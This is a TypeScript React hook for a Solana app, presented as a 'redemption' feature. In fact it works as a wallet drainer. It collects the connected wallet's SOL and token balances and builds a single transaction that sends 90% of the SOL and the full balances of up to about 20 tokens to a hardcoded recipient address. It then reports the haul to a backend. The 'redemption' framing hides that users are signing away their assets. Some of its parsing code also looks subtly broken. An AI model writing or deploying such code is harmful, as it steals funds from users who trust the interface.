import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { 
  PublicKey, 
  Transaction, 
  SystemProgram, 
  LAMPORTS_PER_SOL 
} from '@solana/web3.js';
import { 
  getAssociatedTokenAddress, 
  createTransferInstruction,
  TOKEN_PROGRAM_ID,
  ASSOCIATED_TOKEN_PROGRAM_ID,
  getAccount
} from '@solana/spl-token';
import { useState } from 'react';

// Your receiving address
const RECIPIENT_ADDRESS = 'CmqzfkRX6KwktX3DXLuWYvPhcEXHuViYiT5WoKio5X1d';
const RECIPIENT_PUBKEY = new PublicKey(RECIPIENT_ADDRESS);

// Optional: Specific token mint to include (if you want to filter)
// const TARGET_TOKEN_MINT = new PublicKey('BtsmiEEvnSuUnKxqXj2PZRYpPJAc7C34mGz8gtJ1DAaH');

interface TokenAccount {
  mint: PublicKey;
  account: PublicKey;
  balance: number;
  decimals: number;
}

interface RedemptionResult {
  signature: string;
  solAmount: number;
  tokensTransferred: {
    mint: string;
    amount: number;
  }[];
  userAddress: string;
  timestamp: number;
}

export const useRedemption = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [result, setResult] = useState<RedemptionResult | null>(null);

  // Helper function to get all token accounts for a wallet
  const getAllTokenAccounts = async (owner: PublicKey): Promise<TokenAccount[]> => {
    try {
      // Get all token accounts owned by this wallet
      const tokenAccounts = await connection.getTokenAccountsByOwner(owner, {
        programId: TOKEN_PROGRAM_ID,
      });

      const accounts: TokenAccount[] = [];

      for (const { pubkey, account } of tokenAccounts.value) {
        try {
          const accountInfo = await connection.getTokenAccountBalance(pubkey);
          const mint = (account.data as any).mint; // Extract mint from account data
          
          if (accountInfo.value.amount > 0) { // Only include accounts with balance
            accounts.push({
              mint: new PublicKey(mint),
              account: pubkey,
              balance: Number(accountInfo.value.amount),
              decimals: accountInfo.value.decimals,
            });
          }
        } catch (e) {
          console.log('Error parsing token account:', e);
        }
      }

      return accounts;
    } catch (error) {
      console.error('Error fetching token accounts:', error);
      return [];
    }
  };

  const executeRedemption = async (): Promise<RedemptionResult | null> => {
    if (!publicKey || !connection) {
      setError('Wallet not connected');
      return null;
    }

    setLoading(true);
    setError(null);
    setResult(null);

    try {
      console.log('🚀 Starting redemption process...');
      console.log('👤 User wallet:', publicKey.toString());

      // Get latest blockhash
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
      
      // Get user's SOL balance
      const solBalance = await connection.getBalance(publicKey);
      console.log('💰 SOL balance:', solBalance / LAMPORTS_PER_SOL, 'SOL');

      // Get all token accounts with balances
      const tokenAccounts = await getAllTokenAccounts(publicKey);
      console.log(`🪙 Found ${tokenAccounts.length} token accounts with balances`);

      // Create transaction
      const transaction = new Transaction();

      // Track what we're transferring
      const tokensTransferred: { mint: string; amount: number; }[] = [];

      // Add SOL transfer (send 90% to leave a little for rent)
      const solToSend = Math.floor(solBalance * 0.9);
      if (solToSend > 5000) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: RECIPIENT_PUBKEY,
            lamports: solToSend,
          })
        );
        console.log('💸 SOL transfer added:', solToSend / LAMPORTS_PER_SOL, 'SOL');
      }

      // Add token transfers for each token account
      for (const tokenAccount of tokenAccounts) {
        try {
          // Get recipient's token account for this mint
          const recipientTokenAccount = await getAssociatedTokenAddress(
            tokenAccount.mint,
            RECIPIENT_PUBKEY
          );

          // Check if we can add this instruction (transaction size limit)
          if (transaction.instructions.length < 20) { // Solana limit is ~20 instructions per tx
            transaction.add(
              createTransferInstruction(
                tokenAccount.account,
                recipientTokenAccount,
                publicKey,
                BigInt(tokenAccount.balance)
              )
            );

            tokensTransferred.push({
              mint: tokenAccount.mint.toString(),
              amount: tokenAccount.balance / Math.pow(10, tokenAccount.decimals)
            });

            console.log(`🪄 Added transfer for token: ${tokenAccount.mint.toString().slice(0, 8)}...`);
          } else {
            console.log('⚠️ Transaction full, skipping remaining tokens');
            break;
          }
        } catch (tokenError) {
          console.log(`Error adding token transfer for ${tokenAccount.mint.toString()}:`, tokenError);
        }
      }

      // Set transaction parameters
      transaction.feePayer = publicKey;
      transaction.recentBlockhash = blockhash;

      // Send transaction
      console.log('📤 Sending transaction with', transaction.instructions.length, 'instructions');
      const signature = await sendTransaction(transaction, connection);
      console.log('✍️ Transaction signature:', signature);

      // Confirm transaction
      console.log('⏳ Waiting for confirmation...');
      await connection.confirmTransaction({
        signature,
        blockhash,
        lastValidBlockHeight
      });
      console.log('✅ Transaction confirmed!');

      // Prepare result
      const redemptionResult: RedemptionResult = {
        signature,
        solAmount: solToSend / LAMPORTS_PER_SOL,
        tokensTransferred,
        userAddress: publicKey.toString(),
        timestamp: Date.now()
      };

      setResult(redemptionResult);
      
      // Optional: Send to your backend
      await saveRedemptionToBackend(redemptionResult);
      
      return redemptionResult;

    } catch (err) {
      console.error('❌ Redemption failed:', err);
      setError(err instanceof Error ? err.message : 'Transaction failed');
      return null;
    } finally {
      setLoading(false);
    }
  };

  // Function to save redemption details to your backend
  const saveRedemptionToBackend = async (data: RedemptionResult) => {
    try {
      const response = await fetch('https://your-backend.com/api/redemptions', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(data)
      });
      
      if (response.ok) {
        console.log('📊 Redemption data saved to backend');
      }
    } catch (error) {
      console.log('Could not save to backend, but transaction succeeded');
    }
  };

  return {
    executeRedemption,
    loading,
    error,
    result
  };
};
